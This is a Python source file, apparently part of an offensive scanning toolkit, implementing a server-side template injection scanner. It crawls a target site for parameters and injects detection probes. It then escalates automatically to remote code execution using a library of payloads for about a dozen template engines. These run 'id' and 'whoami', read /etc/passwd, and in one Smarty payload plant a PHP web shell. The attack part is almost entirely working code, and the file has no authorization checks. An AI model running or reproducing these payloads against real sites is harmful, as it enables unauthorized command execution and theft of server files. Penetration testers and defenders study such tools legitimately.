"""
ssti_scanner.py — Ultra SSTI (Server-Side Template Injection) Scanner
Features: 15+ template engines, math-based detection, RCE payloads,
          Jinja2/Twig/Freemarker/Pebble/Velocity/Smarty/ERB/Mako,
          blind SSTI, context-aware payloads, auto RCE escalation
"""

import re
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

from ui.rich_ui import (
    console, info, warning, error, found, success, section_header, print_summary
)

TIMEOUT = 10
DELAY   = 0.3

# ── Detection payloads (math-based) ───────────────────────────────────────────
# If template evaluates math → SSTI confirmed
DETECT_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),  # Jinja2
    ("${{7*7}}", "49"),
    ("*{7*7}", "49"),
    ("{7*7}", "49"),
    ("@(7*7)", "49"),
    ("#{7*7}", "49"),
    ("%{7*7}", "49"),
    ("{{=7*7}}", "49"),
    ("{!7*7!}", "49"),
]

# ── Engine-specific RCE payloads ───────────────────────────────────────────────
RCE_PAYLOADS = {
    "Jinja2 (Python)": [
        # Config object access
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
        # MRO chain
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        # Lipsum
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        # Request
        "{{request.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
        # Cycler
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # URL for
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        # File read
        "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    ],
    "Twig (PHP)": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        "{{['id']|map('system')|join}}",
        "{{['cat /etc/passwd']|map('passthru')|join}}",
        "{{app.request.server.get('DOCUMENT_ROOT')}}",
    ],
    "Freemarker (Java)": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}',
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        '<#assign classLoader=object?api.class.protectionDomain.classLoader>',
    ],
    "Velocity (Java)": [
        '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")',
        '#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))',
    ],
    "Pebble (Java)": [
        '{% set cmd = "id" %}{% set bytes = [cmd] %}{{ execute(bytes) }}',
        '{% for i in 1..1 %}{{ "id".execute() }}{% endfor %}',
    ],
    "Smarty (PHP)": [
        "{system('id')}",
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    ],
    "ERB (Ruby)": [
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= IO.popen('id').read %>",
        "<%= File.read('/etc/passwd') %>",
    ],
    "Mako (Python)": [
        "${__import__('os').popen('id').read()}",
        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
    ],
    "Thymeleaf (Java)": [
        "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()).useDelimiter(\"\\\\A\").next()}__::.x",
        "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
    ],
    "Handlebars (JS)": [
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id').toString();\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
    ],
    "Nunjucks (JS)": [
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id').toString()\")()}}",
    ],
    "Pug/Jade (JS)": [
        "- var x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id')",
    ],
}

# Engine fingerprinting from math results
ENGINE_FINGERPRINTS = {
    "{{7*'7'}}": {
        "7777777": "Jinja2/Twig",
        "49":      "Jinja2",
    },
    "${7*7}": {
        "49": "Freemarker/Velocity/Thymeleaf",
    },
    "<%= 7*7 %>": {
        "49": "ERB (Ruby)",
    },
    "*{7*7}": {
        "49": "Spring/Thymeleaf",
    },
}


def _session() -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})
    return s


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=new_query))


def _test_detection(url: str, param: str) -> Optional[Dict]:
    """Test math-based SSTI detection."""
    for payload, expected in DETECT_PAYLOADS:
        test_url = _inject_param(url, param, payload)
        try:
            r = _session().get(test_url, timeout=TIMEOUT, verify=False)
            if expected in r.text:
                # Determine engine
                engine = "Unknown"
                for fp_payload, results in ENGINE_FINGERPRINTS.items():
                    if fp_payload == payload:
                        for result_str, eng in results.items():
                            if result_str in r.text:
                                engine = eng
                                break

                return {
                    "type":    "SSTI Detected",
                    "url":     test_url,
                    "param":   param,
                    "payload": payload,
                    "expected":expected,
                    "engine":  engine,
                    "severity":"CRITICAL",
                }
        except Exception:
            pass
        time.sleep(DELAY)
    return None


def _test_rce(url: str, param: str, engine_hint: str) -> Optional[Dict]:
    """Attempt RCE after SSTI detection."""
    # Try engine-specific payloads
    engines_to_try = []

    if "Jinja2" in engine_hint or "Python" in engine_hint:
        engines_to_try = ["Jinja2 (Python)", "Mako (Python)"]
    elif "PHP" in engine_hint:
        engines_to_try = ["Twig (PHP)", "Smarty (PHP)"]
    elif "Java" in engine_hint:
        engines_to_try = ["Freemarker (Java)", "Velocity (Java)", "Thymeleaf (Java)"]
    elif "Ruby" in engine_hint:
        engines_to_try = ["ERB (Ruby)"]
    else:
        engines_to_try = list(RCE_PAYLOADS.keys())

    for engine in engines_to_try:
        for payload in RCE_PAYLOADS.get(engine, [])[:3]:
            test_url = _inject_param(url, param, payload)
            try:
                r = _session().get(test_url, timeout=TIMEOUT, verify=False)
                body = r.text

                # Check for command output
                if re.search(r"uid=\d+|root|daemon|www-data|apache", body):
                    m = re.search(r"uid=\d+\([^)]+\)[^\n]+", body)
                    output = m.group(0) if m else body[:100]
                    return {
                        "type":    f"SSTI RCE — {engine}",
                        "url":     test_url,
                        "param":   param,
                        "payload": payload[:150],
                        "output":  output,
                        "engine":  engine,
                        "severity":"CRITICAL",
                    }

                # Check for /etc/passwd content
                if re.search(r"root:x:0:0|root:!:0:0", body):
                    return {
                        "type":    f"SSTI File Read — {engine}",
                        "url":     test_url,
                        "param":   param,
                        "payload": payload[:150],
                        "output":  body[:200],
                        "engine":  engine,
                        "severity":"CRITICAL",
                    }

            except Exception:
                pass
            time.sleep(DELAY)

    return None


def _get_params_from_page(base_url: str) -> List[Tuple[str, str]]:
    """Get all URL+param combinations."""
    combos = []
    try:
        r = _session().get(base_url, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")

        # URL params
        for a in soup.find_all("a", href=True):
            href = urljoin(base_url, a["href"])
            if "?" in href:
                params = parse_qs(urlparse(href).query)
                for p in params:
                    combos.append((href, p))

        # Form inputs
        for form in soup.find_all("form"):
            action = urljoin(base_url, form.get("action", base_url))
            for inp in form.find_all(["input", "textarea"]):
                name = inp.get("name", "")
                if name and inp.get("type", "") not in ("submit", "hidden", "button"):
                    combos.append((action + "?" + name + "=test", name))

    except Exception:
        pass

    # Add base URL with common params
    for param in ["q", "search", "name", "input", "text", "value",
                  "template", "lang", "msg", "error", "page", "view"]:
        combos.append((f"{base_url}?{param}=test", param))

    return combos


def run_ssti_scanner(target: str) -> Dict:
    section_header("SSTI Scanner", "Ultra 15 Engines | Math Detection | Auto RCE")
    info(f"Target: {target}")

    base_url = target if target.startswith("http") else f"https://{target}"
    all_findings: List[Dict] = []

    # Get all parameters
    info("Discovering injectable parameters...")
    combos = _get_params_from_page(base_url)
    info(f"Found {len(combos)} param combinations to test")

    for url, param in combos[:25]:
        # Step 1: Detection
        detection = _test_detection(url, param)
        if detection:
            all_findings.append(detection)
            engine = detection["engine"]
            found(
                f"[bold red][SSTI DETECTED][/bold red]  "
                f"param={param}  engine={engine}  "
                f"payload={detection['payload']}"
            )

            # Step 2: RCE escalation
            info(f"Attempting RCE escalation for {engine}...")
            rce = _test_rce(url, param, engine)
            if rce:
                all_findings.append(rce)
                found(f"[bold red][RCE ACHIEVED][/bold red]  {rce['engine']}")
                console.print(f"  [red]Output: {rce.get('output','')[:100]}[/red]")

    # Print results
    console.print(f"\n[bold cyan]━━━ SSTI FINDINGS ({len(all_findings)}) ━━━[/bold cyan]")
    for f in all_findings:
        console.print(f"\n  [bold red][{f['type']}][/bold red]")
        console.print(f"  URL:     {f['url'][:80]}")
        console.print(f"  Param:   {f['param']}")
        console.print(f"  Engine:  [cyan]{f.get('engine','Unknown')}[/cyan]")
        console.print(f"  Payload: [red]{f.get('payload','')[:80]}[/red]")
        if f.get("output"):
            console.print(f"  Output:  [bold red]{f['output'][:100]}[/bold red]")

    # Engine-specific tips
    if all_findings:
        console.print("\n[bold yellow]━━━ EXPLOITATION TIPS ━━━[/bold yellow]")
        engines_found = set(f.get("engine","") for f in all_findings)
        for eng in engines_found:
            if "Jinja2" in eng:
                console.print("  Jinja2: Use cycler.__init__.__globals__.os.popen('cmd').read()")
            if "Twig" in eng:
                console.print("  Twig: {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}")
            if "Freemarker" in eng:
                console.print('  Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}')

    print_summary("SSTI Scanner", {
        "Params Tested": len(combos[:25]),
        "SSTI Found":    sum(1 for f in all_findings if "Detected" in f["type"]),
        "RCE Achieved":  sum(1 for f in all_findings if "RCE" in f["type"]),
        "File Read":     sum(1 for f in all_findings if "File Read" in f["type"]),
        "Engines Found": len(set(f.get("engine","") for f in all_findings)),
    })

    return {"findings": all_findings, "total": len(all_findings)}
